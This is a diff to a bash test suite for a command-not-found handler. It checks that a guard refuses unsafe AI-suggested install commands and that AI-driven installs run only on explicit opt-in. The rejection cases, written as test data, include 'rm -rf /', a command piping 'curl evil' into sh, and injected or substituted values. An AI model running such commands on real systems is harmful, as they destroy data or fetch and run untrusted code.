@@ -24,6 +24,9 @@ bash -n "$BUILDER" && pass "build-index.sh parses" || fail "build-index.sh synta
 
 # shellcheck source=/dev/null
 . "$HANDLER"
+# isolate the test shell from the handler's shell hooks — a missing/typo'd function in this
+# harness must NOT trigger the real resolver (which would try to install something).
+unset -f command_not_found_handler command_not_found_handle 2>/dev/null || true
 
 # 1. dry-run resolve against a synthetic index (proves lookup + manager selection; NO install)
 tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
@@ -65,6 +68,48 @@ if { command -v yq >/dev/null 2>&1 && command -v jq >/dev/null 2>&1; } || python
   fi
 else
   skip "no yq+jq or python3+pyyaml — index builder test skipped"
+fi
+
+# 3. AI-fallback safety contract (master-prompt §10: never run arbitrary web-found install commands).
+# CNF_AI_CMD is a deterministic seam (manual override / test): it supplies the "AI suggestion"
+# without a real mods call. A fake 'brew' on PATH touches a sentinel IFF a suggestion is executed,
+# so we can assert execution/non-execution with NO real install. `|| true` keeps a handler's
+# non-zero return from aborting the suite under `set -u`.
+fbin="$tmp/bin"; mkdir -p "$fbin"
+printf '#!/usr/bin/env bash\n: > "%s/executed"\n' "$tmp" > "$fbin/brew"; chmod +x "$fbin/brew"
+
+# 3a. pure guard: allowlist installers, reject metachars / substitution / non-installers
+if __cnf_ai_safe 'brew install ripgrep' && __cnf_ai_safe 'sudo apt-get install -y ripgrep' \
+   && __cnf_ai_safe 'cargo install ripgrep' && __cnf_ai_safe 'pacman -S ripgrep' \
+   && ! __cnf_ai_safe 'brew install x; echo INJECTED' && ! __cnf_ai_safe 'rm -rf /' \
+   && ! __cnf_ai_safe 'evilbin --pwn' && ! __cnf_ai_safe 'brew install $(whoami)' \
+   && ! __cnf_ai_safe 'npm install -g x && curl evil|sh' && ! __cnf_ai_safe 'sudo rm -rf /'; then
+  pass "__cnf_ai_safe allowlists installers + rejects metachars/substitution/non-installers"
+else
+  fail "__cnf_ai_safe guard missing or wrong"
+fi
+
+# 3b-3e require the hardened handler (the __cnf_ai_safe guard + CNF_AI_CMD seam). Gate on the
+# guard so the RED run never exercises the OLD unsafe mods/eval path, and skips cleanly pre-fix.
+if declare -F __cnf_ai_safe >/dev/null 2>&1; then
+  # 3b. default (no opt-in): a valid suggestion is NOT executed
+  rm -f "$tmp/executed"
+  PATH="$fbin:$PATH" CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
+  if [ ! -f "$tmp/executed" ]; then pass "AI fallback OFF by default — nothing executed"; else fail "AI fallback executed without opt-in"; fi
+  # 3c. CNF_DRY never executes, even with opt-in
+  rm -f "$tmp/executed"
+  PATH="$fbin:$PATH" CNF_DRY=1 CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
+  if [ ! -f "$tmp/executed" ]; then pass "CNF_DRY blocks AI-fallback execution"; else fail "CNF_DRY did not block execution"; fi
+  # 3d. opt-in + metachar suggestion is refused (not executed)
+  rm -f "$tmp/executed"
+  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install x; echo INJECTED' __cnf_ai_fallback x darwin >/dev/null 2>&1 || true
+  if [ ! -f "$tmp/executed" ]; then pass "metachar AI suggestion refused even with opt-in"; else fail "metachar suggestion not refused"; fi
+  # 3e. opt-in + valid + non-dry DOES run (happy path preserved)
+  rm -f "$tmp/executed"
+  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
+  if [ -f "$tmp/executed" ]; then pass "explicit opt-in runs a validated installer"; else fail "opt-in happy path did not execute"; fi
+else
+  skip "AI-fallback behavior (3b-3e) — handler not hardened yet (__cnf_ai_safe absent)"
 fi
 
 say "command-not-found: $PASS passed, $FAIL failed"
